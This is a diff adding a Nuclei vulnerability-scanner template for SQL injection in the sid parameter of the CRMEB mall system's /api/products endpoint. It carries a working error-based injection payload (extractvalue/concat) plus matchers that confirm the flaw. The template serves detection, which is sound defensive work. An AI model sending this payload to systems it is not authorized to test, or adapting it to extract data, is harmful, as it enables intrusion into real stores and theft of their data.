@@ -1,0 +1,29 @@
+id: crmeb-datong-sid-sqli
+
+info:
+  name: CRMEB DaTong sid SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    CRMEB open version v4 is a free and open-source mall system based on the UINAPP+thinkphp6 framework. The sid parameter under the /api/products path has unfiltered SQL statement splicing, resulting in SQL injection.
+  tags: sqli
+  reference:
+    - https://www.crmeb.com
+
+variables:
+  rand_out: "{{rand_int(100, 199)}}"
+  rand_out_md5: "{{md5(to_string(rand_out))}}"
+
+http:
+  - raw:
+      - |
+        GET /api/products?page=1&limit=8&keyword=keyword&sid=extractvalue(1,concat(char(126),md5({{rand_out}})))&news=0&priceOrder=&salesOrder= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+      - type: regex
+        regex:
+          - "{{rand_out_md5[1:-5]}}"
